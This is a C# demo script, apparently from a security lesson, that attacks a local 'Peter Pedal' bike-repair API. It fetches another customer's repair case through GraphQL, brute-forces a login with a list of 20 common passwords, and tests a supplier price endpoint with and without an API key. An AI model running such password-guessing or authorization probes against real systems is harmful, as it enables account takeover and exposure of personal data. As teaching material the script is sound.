using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text.Json;

// "Other systems" that call Peter Pedal's API. Start the API first, then run for example:
//   dotnet run --project scripts/PeterPedal.Scripts -- attack
using var http = new HttpClient { BaseAddress = new Uri("http://localhost:5080") };

switch (args.FirstOrDefault())
{
    case "attack":
        await Attack();
        return 0;
    case "guess":
        await Guess();
        return 0;
    case "supplier":
        await Supplier(args.ElementAtOrDefault(1));
        return 0;
    default:
        Console.WriteLine("Brug: dotnet run --project scripts/PeterPedal.Scripts -- attack | guess | supplier [api-nøgle]");
        return 1;
}

// Lise (a customer) logs in and asks for case 1, which is Egon's.
async Task Attack()
{
    var token = await Login("lise", "lise123");
    var request = new HttpRequestMessage(HttpMethod.Post, "/graphql")
    {
        Content = JsonContent.Create(new { query = "{ repairCase(id: 1) { id frameNumber problem customer { firstName lastName phone } } }" })
    };
    request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
    var response = await http.SendAsync(request);

    Console.WriteLine("Lise (kunde) spørger efter sag 1, som er Egons:");
    Console.WriteLine(await response.Content.ReadAsStringAsync());
}

// Tries 20 common passwords for Peter, like an attacker would. The right one is number 8.
async Task Guess()
{
    string[] guesses =
    {
        "123456", "password", "peter", "qwerty", "cykel", "peter1", "admin", "peter123", "letmein", "welcome",
        "111111", "abc123", "pedal", "cykel123", "sommer2026", "peterpedal", "iloveyou", "monkey", "dragon", "master"
    };
    for (var i = 0; i < guesses.Length; i++)
    {
        var response = await http.PostAsJsonAsync("/api/auth/login", new { username = "peter", password = guesses[i] });
        Console.WriteLine($"{i + 1,2}. {guesses[i],-12} -> {(int)response.StatusCode} {response.StatusCode}");
    }
}

// The supplier's system sets the price of spare part 1 (Gear cable) to 175 kr.
async Task Supplier(string? apiKey)
{
    var request = new HttpRequestMessage(HttpMethod.Put, "/api/supplier/spareparts/1/price")
    {
        Content = JsonContent.Create(new { price = 175.0m })
    };
    if (apiKey is not null)
    {
        request.Headers.Add("X-Api-Key", apiKey);
    }
    var response = await http.SendAsync(request);

    Console.WriteLine(apiKey is null ? "Leverandøren kalder uden API-nøgle:" : $"Leverandøren kalder med API-nøglen '{apiKey}':");
    Console.WriteLine($"{(int)response.StatusCode} {response.StatusCode}");
}

async Task<string> Login(string username, string password)
{
    var response = await http.PostAsJsonAsync("/api/auth/login", new { username, password });
    if (!response.IsSuccessStatusCode)
    {
        Console.WriteLine($"Login som {username} fejlede: {(int)response.StatusCode} {response.StatusCode}. Virker POST /api/auth/login?");
        Environment.Exit(1);
    }
    var body = await response.Content.ReadFromJsonAsync<JsonElement>();
    return body.GetProperty("token").GetString()!;
}
